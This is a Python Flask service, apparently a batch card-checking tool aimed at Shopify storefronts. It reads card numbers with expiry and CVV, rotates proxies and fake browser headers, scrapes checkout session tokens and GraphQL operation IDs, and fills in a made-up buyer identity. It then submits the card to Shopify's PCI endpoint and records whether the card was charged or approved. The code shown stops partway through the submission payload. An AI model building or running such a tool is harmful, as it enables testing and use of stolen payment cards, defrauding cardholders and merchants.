# app.py - Updated with Batch Support and Concurrency
import requests
import re
import json
import html
import random
import string
import urllib.parse
from typing import List, Optional, Tuple
from flask import Flask, request, jsonify
import time
import logging
import sys
from datetime import datetime
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ====================== CONFIGURATION ======================
FALLBACK_POLL_ID = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
MAX_WORKERS = 5  # Limit concurrent requests to avoid rate limiting

# Thread-local storage for sessions
_thread_local = threading.local()

# ====================== SESSION MANAGEMENT ======================
def get_session(proxy_config=None):
    """Get thread-local session with proxy support"""
    if not hasattr(_thread_local, 'session'):
        _thread_local.session = requests.Session()
        
        # Configure connection pooling
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10,
            pool_maxsize=20,
            max_retries=2,
            pool_block=False
        )
        _thread_local.session.mount('http://', adapter)
        _thread_local.session.mount('https://', adapter)
        
        # Set default headers
        _thread_local.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
    
    if proxy_config:
        _thread_local.session.proxies.update(proxy_config)
    
    return _thread_local.session

# ====================== CORE FUNCTIONS ======================
def normalize_url(url: str) -> str:
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def extract_checkout_token(url: str) -> str:
    token_re = re.compile(r'/checkouts/cn/([^/?]+)')
    m = token_re.search(url)
    if m:
        return m.group(1)
    token_re2 = re.compile(r'/cart/c/([^/?]+)')
    m2 = token_re2.search(url)
    if m2:
        return m2.group(1)
    return ""

def extract_session_token(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    patterns = [
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
        r'sessionToken["\']\s*:\s*["\']([^"\']+)',
        r'checkoutSessionToken["\']\s*:\s*["\']([^"\']+)',
    ]
    for p in patterns:
        m = re.search(p, unescaped)
        if m:
            val = m.group(1)
            return html.unescape(val).strip('"')
    return ""

def extract_stable_id(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    re_pattern = re.compile(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"')
    match = re_pattern.search(unescaped)
    if match:
        return match.group(1)
    return ""

def extract_commit_sha(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    re_pattern = re.compile(r'"commitSha"\s*:\s*"([a-f0-9]{40})"')
    match = re_pattern.search(unescaped)
    if match:
        return match.group(1)
    return ""

def extract_source_token(html_text: str) -> str:
    re_pattern = re.compile(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"')
    m = re_pattern.search(html_text)
    if m:
        val = html.unescape(m.group(1))
        return val.strip('"')
    return ""

def extract_identification_signature(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    patterns = [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'callerIdentificationSignature["\s:]+([^"}\s,]+)',
    ]
    for p in patterns:
        m = re.search(p, unescaped)
        if m:
            return m.group(1)
    return ""

def extract_actions_js_url(html_text: str, shop_url: str) -> str:
    patterns = [
        r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[^"]*actions[^"]*\.js)',
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return shop_url + match.group(1)
    return ""

def extract_processing_js_url(html_text: str, shop_url: str) -> str:
    patterns = [
        r'(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)',
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return shop_url + match.group(1)
    return ""

def extract_events_js_url(html_text: str, shop_url: str) -> str:
    patterns = [
        r'(/cdn/shopifycloud/checkout-web/assets/c1/events-shared[^"]+\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[^"]*events-shared[^"]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[^"]*events[^"]*\.js)',
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return shop_url + match.group(1)
    script_events = re.findall(r'<script[^>]+src="([^"]+events[^"]+\.js)"', html_text)
    if script_events:
        for s in script_events:
            if not s.startswith('http'):
                return shop_url + s
            return s
    return ""

def fetch_js(session_obj, js_url: str, shop_url: str, referer: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "referer": referer,
        "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
    }
    resp = session_obj.get(js_url, headers=headers, timeout=30)
    if resp.status_code != 200:
        raise Exception(f"GET JS returned status {resp.status_code}")
    return resp.text

def extract_proposal_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"',
        r'name:\s*"Proposal"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"Proposal"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'id:\s*"([a-f0-9]{64})"[^}]{0,200}"Proposal"',
        r'id:\s*\'([a-f0-9]{64})\'\s*,\s*type:\s*\'query\'\s*,\s*name:\s*\'Proposal\'',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

def extract_submit_for_completion_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"',
        r'name:\s*"SubmitForCompletion"\s*,\s*type:\s*"mutation"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"SubmitForCompletion"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'id:\s*"([a-f0-9]{64})"[^}]{0,200}"SubmitForCompletion"',
        r'id:\s*\'([a-f0-9]{64})\'\s*,\s*type:\s*\'mutation\'\s*,\s*name:\s*\'SubmitForCompletion\'',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'id:\s*"([a-f0-9]{64})"[^}]{0,200}"PollForReceipt"',
        r'id:\s*\'([a-f0-9]{64})\'\s*,\s*type:\s*\'query\'\s*,\s*name:\s*\'PollForReceipt\'',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
        r'([a-f0-9]{64}).{0,300}?PollForReceipt',
        r'id:([a-f0-9]{64}),type:"query",name:"PollForReceipt"',
        r'id:"([a-f0-9]{64})",.*?name:"PollForReceipt"',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

def extract_receipt_id(submit_body: str) -> str:
    patterns = [
        r'"id"\s*:\s*"(gid://shopify/ProcessedReceipt/[0-9]+)"',
        r'"id"\s*:\s*"(gid://shopify/[A-Za-z]+Receipt/[0-9]+)"',
        r'"receipt"\s*:\s*\{\s*"id"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_receipt_session_token(submit_body: str) -> str:
    patterns = [
        r'"sessionToken"\s*:\s*"([^"]+)"',
        r'"receiptSessionToken"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_queue_token(response_body: str) -> str:
    re_pattern = re.compile(r'"queueToken"\s*:\s*"([^"]+)"')
    m = re_pattern.search(response_body)
    if m:
        return m.group(1)
    return ""

def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"selectedDeliveryStrategy".*?"handle"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""

def extract_signed_handles(proposal_body: str) -> List[str]:
    re_pattern = re.compile(r'"signedHandle"\s*:\s*"([^"]+)"')
    matches = re_pattern.findall(proposal_body)
    return matches

def extract_submit_error(submit_body: str) -> str:
    error_re = re.compile(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"')
    matches = error_re.findall(submit_body)
    if matches:
        return matches[0]
    code_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
    matches = code_re.findall(submit_body)
    if matches:
        return matches[0]
    return ""

def extract_shipping_amount(proposal_body: str) -> str:
    patterns = [
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        r'"shippingAmount"[^}]*"amount"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""

def extract_checkout_total(proposal_body: str) -> str:
    re_pattern = re.compile(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_seller_total(proposal_body: str) -> str:
    re_pattern = re.compile(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_seller_currency(proposal_body: str) -> str:
    re_pattern = re.compile(r'"supportedCurrencies"\s*:\s*\["([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_seller_country(proposal_body: str) -> str:
    re_pattern = re.compile(r'"supportedCountries"\s*:\s*\["([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"', f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
    if country != "US":
        payload = payload.replace('"countryCode": "US"', f'"countryCode": "{country}"')
        payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    token_part = ''.join(random.choice(chars) for _ in range(10))
    return f"{checkout_token}-{token_part}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

def extract_currency_from_cart(cart_data: dict) -> str:
    if 'currency' in cart_data:
        return cart_data['currency']
    if 'items' in cart_data and len(cart_data['items']) > 0:
        if 'price' in cart_data['items'][0]:
            price_str = cart_data['items'][0]['price']
            match = re.match(r'^[^\d]*', price_str)
            if match:
                return match.group(0)
    return "USD"

def extract_pci_session_id(pci_body: str) -> str:
    re_pattern = re.compile(r'"id"\s*:\s*"([^"]+)"')
    match = re_pattern.search(pci_body)
    if match:
        return match.group(1)
    return ""

def parse_card(card_string: str) -> Tuple[str, str, str, str]:
    """Parse card string format: 4111111111111111|09|2027|123"""
    parts = card_string.split('|')
    if len(parts) == 4:
        number = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = parts[3].strip()
        return number, month, year, cvv
    return "", "", "", ""

def parse_proxy(proxy_string: str) -> Optional[dict]:
    """Parse proxy string format: ip:port:username:password"""
    if not proxy_string:
        return None
    
    parts = proxy_string.split(':')
    if len(parts) == 4:
        return {
            'http': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
            'https': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        }
    elif len(parts) == 2:
        return {
            'http': f"http://{parts[0]}:{parts[1]}",
            'https': f"http://{parts[0]}:{parts[1]}"
        }
    return None

def get_random_user_agent() -> str:
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    ]
    return random.choice(user_agents)

# ====================== CHECKOUT FUNCTION ======================
def run_checkout(domain: str, card_number: str, card_month: str, card_year: str, card_cvv: str, proxy_config: Optional[dict] = None, under: int = 10) -> dict:
    """Main checkout automation function"""
    start_time = time.time()
    result = {
        'Code': 'ERROR',
        'Response': 'UNKNOWN',
        'Price': '0 USD',
        'Site': domain,
        'Time': '0s',
        'Charged': 'False',
        'Approved': 'False'
    }
    
    try:
        # Setup session with proxy if provided
        session = get_session(proxy_config)
        if proxy_config:
            session.proxies.update(proxy_config)
            logger.info(f"Using proxy: {proxy_config}")
        
        domain = normalize_url(domain)
        
        # Home page request
        home_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': get_random_user_agent(),
        }
        
        session.get(domain + '/', headers=home_headers, timeout=30)
        
        # Get products
        products_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'referer': domain + '/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': get_random_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        products_resp = session.get(domain + '/products.json?limit=250', headers=products_headers, timeout=30)
        if products_resp.status_code != 200:
            products_resp = session.get(domain + '/products.json?limit=250&page=1', headers=products_headers, timeout=30)
        
        products = products_resp.json().get('products', [])
        
        if not products:
            result['Code'] = 'NO_PRODUCTS'
            result['Response'] = 'No products found'
            return result
        
        # Select cheapest product
        selected_product = None
        selected_variant = None
        min_price = float('inf')
        for product in products:
            for variant in product.get('variants', []):
                if variant.get('available') and variant.get('price'):
                    price = float(variant['price'])
                    if price > 0 and price < min_price:
                        min_price = price
                        selected_product = product
                        selected_variant = variant
        
        if not selected_product:
            selected_product = products[0]
            selected_variant = selected_product['variants'][0]
        
        logger.info(f"Selected product: {selected_product['title']} - ${selected_variant['price']}")
        
        # Add to cart
        add_headers = {
            'accept': 'application/javascript',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': domain,
            'referer': f"{domain}/products/{selected_product['handle']}?variant={selected_variant['id']}",
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': get_random_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        add_data = {
            'id': str(selected_variant['id']),
            'quantity': '1',
            'form_type': 'product',
            'utf8': '✓',
        }
        
        add_resp = session.post(domain + '/cart/add', headers=add_headers, data=add_data, timeout=30)
        
        # Get cart
        cart_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'referer': f"{domain}/products/{selected_product['handle']}?variant={selected_variant['id']}",
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': get_random_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        cart_resp = session.get(domain + '/cart.js', headers=cart_headers, timeout=30)
        cart_data = cart_resp.json()
        cart_token = cart_data.get('token', '')
        clean_token = cart_token.split('?')[0] if cart_token else ""
        key = cart_token.split('?key=')[1] if '?key=' in cart_token else None
        currency = extract_currency_from_cart(cart_data)
        country = "US"
        
        # Checkout
        checkout_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': f"{domain}/products/{selected_product['handle']}?variant={selected_variant['id']}",
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': get_random_user_agent(),
        }
        
        checkout_params = {}
        if key:
            checkout_params['key'] = key
        checkout_params['skip_shop_pay'] = 'true'
        
        checkout_url = f"{domain}/cart/c/{clean_token}"
        checkout_resp = session.get(checkout_url, params=checkout_params, headers=checkout_headers, allow_redirects=True, timeout=30)
        checkout_url_final = checkout_resp.url
        html_text = checkout_resp.text
        
        # Extract tokens
        checkout_token = extract_checkout_token(checkout_url_final)
        session_token = extract_session_token(html_text)
        stable_id = extract_stable_id(html_text)
        build_id = extract_commit_sha(html_text)
        source_token = extract_source_token(html_text)
        ident_sig = extract_identification_signature(html_text)
        
        if not session_token:
            alt_token_re = re.compile(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"')
            m_alt = alt_token_re.search(html.unescape(html_text))
            if m_alt:
                session_token = m_alt.group(1)
        
        if not source_token:
            source_token = checkout_token
        
        # Extract JS URLs and IDs
        actions_url = extract_actions_js_url(html_text, domain)
        processing_url = extract_processing_js_url(html_text, domain)
        events_js_url = extract_events_js_url(html_text, domain)
        
        if not actions_url:
            all_scripts = re.findall(r'<script[^>]+src="([^"]+\.js)"', html_text)
            for script in all_scripts:
                if 'actions' in script.lower():
                    if not script.startswith('http'):
                        actions_url = domain + script
                    else:
                        actions_url = script
                    break
        
        js_body = ""
        if actions_url:
            try:
                js_body = fetch_js(session, actions_url, domain, checkout_url_final)
            except Exception as e:
                logger.warning(f"Failed to fetch actions JS: {e}")
        
        proposal_id = extract_proposal_id(js_body) if js_body else ""
        submit_id = extract_submit_for_completion_id(js_body) if js_body else ""
        
        poll_id = ""
        for source_js in [events_js_url, processing_url]:
            if source_js and not poll_id:
                try:
                    js = fetch_js(session, source_js, domain, checkout_url_final)
                    poll_id = extract_poll_for_receipt_id(js)
                except Exception as e:
                    logger.warning(f"Failed to fetch JS for poll ID: {e}")
        
        if not poll_id and js_body:
            poll_id = extract_poll_for_receipt_id(js_body)
        
        if not poll_id:
            poll_id = FALLBACK_POLL_ID
        
        if not all([checkout_token, session_token, stable_id, build_id, proposal_id, submit_id]):
            result['Code'] = 'EXTRACTION_FAILED'
            result['Response'] = 'Failed to extract required tokens'
            return result
        
        # Build proposal
        base_proposal = {
            "sessionInput": {"sessionToken": session_token},
            "queueToken": None,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"partialStreetAddress": {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": False}},
                    "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{selected_variant['id']}", "variantId": f"gid://shopify/ProductVariant/{selected_variant['id']}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []
                }]
            },
            "memberships": {"memberships": []},
            "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}},
            "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": country}, "phoneCountryCode": country, "marketingConsent": [], "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False},
            "tip": {"tipLines": []}, "poNumber": None,
            "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []}, "nonNegotiableTerms": None,
            "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
            "optionalDuties": {"buyerRefusesDuties": False}, "cartMetafields": []
        }
        
        # Proposal 1
        proposal_gql = json.dumps({
            "variables": base_proposal,
            "operationName": "Proposal",
            "id": proposal_id
        })
        proposal_gql = patch_payload(proposal_gql, currency, country)
        
        proposal_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': domain,
            'referer': checkout_url_final,
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
            'user-agent': get_random_user_agent(),
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-build-id': build_id,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-source-id': source_token,
        }
        
        proposal_resp = session.post(
            f"{domain}/checkouts/internal/graphql/persisted",
            params={'operationName': 'Proposal'},
            headers=proposal_headers,
            data=proposal_gql,
            timeout=30
        )
        proposal_data = proposal_resp.json()
        queue_token = extract_queue_token(json.dumps(proposal_data))
        
        # Generate email and address
        email_domains = ["gmail.com", "yahoo.com", "outlook.com"]
        first_names = ["james", "john", "robert", "michael", "william"]
        last_names = ["smith", "johnson", "williams", "brown", "jones"]
        email = f"{random.choice(first_names)}{random.choice(last_names)}{random.randint(1, 999)}@{random.choice(email_domains)}"
        
        addr = {
            "first_name": "Python",
            "last_name": "Shelby",
            "address1": "St 82",
            "address2": "",
            "city": "Ny",
            "country_code": "US",
            "zone_code": "NY",
            "postal_code": "10010",
            "phone": "+12125551212",
        }
        
        # Proposal 2
        proposal2_variables = base_proposal.copy()
        proposal2_variables["queueToken"] = queue_token
        proposal2_variables["buyerIdentity"]["email"] = email
        proposal2_variables["buyerIdentity"]["emailChanged"] = True
        
        proposal2_gql = json.dumps({
            "variables": proposal2_variables,
            "operationName": "Proposal",
            "id": proposal_id
        })
        proposal2_gql = patch_payload(proposal2_gql, currency, country)
        
        proposal2_resp = session.post(
            f"{domain}/checkouts/internal/graphql/persisted",
            params={'operationName': 'Proposal'},
            headers=proposal_headers,
            data=proposal2_gql,
            timeout=30
        )
        proposal2_data = proposal2_resp.json()
        queue_token2 = extract_queue_token(json.dumps(proposal2_data))
        
        # Proposal 3
        proposal3_variables = proposal2_variables.copy()
        proposal3_variables["queueToken"] = queue_token2
        proposal3_variables["delivery"]["deliveryLines"][0]["destination"]["partialStreetAddress"] = {
            "address1": addr["address1"], "city": addr["city"], "countryCode": addr["country_code"],
            "postalCode": addr["postal_code"], "firstName": addr["first_name"], "lastName": addr["last_name"],
            "zoneCode": addr["zone_code"], "phone": addr["phone"], "oneTimeUse": False
        }
        proposal3_variables["payment"]["billingAddress"]["streetAddress"] = {
            "address1": addr["address1"], "city": addr["city"], "countryCode": addr["country_code"],
            "postalCode": addr["postal_code"], "firstName": addr["first_name"], "lastName": addr["last_name"],
            "zoneCode": addr["zone_code"], "phone": addr["phone"]
        }
        proposal3_variables["buyerIdentity"]["emailChanged"] = False
        
        proposal3_gql = json.dumps({
            "variables": proposal3_variables,
            "operationName": "Proposal",
            "id": proposal_id
        })
        proposal3_gql = patch_payload(proposal3_gql, currency, country)
        
        proposal3_resp = session.post(
            f"{domain}/checkouts/internal/graphql/persisted",
            params={'operationName': 'Proposal'},
            headers=proposal_headers,
            data=proposal3_gql,
            timeout=30
        )
        proposal3_data = proposal3_resp.json()
        queue_token3 = extract_queue_token(json.dumps(proposal3_data))
        
        proposal3_str = json.dumps(proposal3_data)
        delivery_handle = extract_delivery_handle(proposal3_str)
        signed_handles = extract_signed_handles(proposal3_str)
        shipping_amount = extract_shipping_amount(proposal3_str)
        total_amount = extract_checkout_total(proposal3_str)
        if not total_amount:
            total_amount = extract_seller_total(proposal3_str)
        
        # PCI Session
        card_name = f"{addr['first_name']} {addr['last_name']}"
        shop_domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        payment_scope = shop_domain
        
        pci_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-identification-signature': ident_sig,
            'user-agent': get_random_user_agent(),
        }
        
        pci_json = {
            'credit_card': {
                'number': card_number,
                'month': int(card_month),
                'year': int(card_year),
                'verification_value': card_cvv,
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': card_name,
            },
            'payment_session_scope': payment_scope,
        }
        
        pci_session = requests.Session()
        if proxy_config:
            pci_session.proxies.update(proxy_config)
        
        pci_resp = pci_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pci_headers, json=pci_json, timeout=30)
        pci_session_id = extract_pci_session_id(pci_resp.text)
        
        # Submit
        attempt_token = generate_attempt_token(checkout_token)
        page_id = generate_page_id()
        
        signed_handles_list = [{"signedHandle": h} for h in signed_handles] if signed_handles else []
        
        submit_variables = {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token3,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "streetAddress": {
                                "address1": addr["address1"], "address2": addr["address2"],
                                "city": addr["city"], "countryCode": addr["country_code"],
                                "postalCode": addr["postal_code"], "firstName": addr["first_name"],
                                "lastName": addr["last_name"], "zoneCode": addr["zone_code"],
                                "phone": addr["phone"], "oneTimeUse": False
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False},
                            "options": {}
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                        "deliveryMethodTypes": ["SHIPPING"],
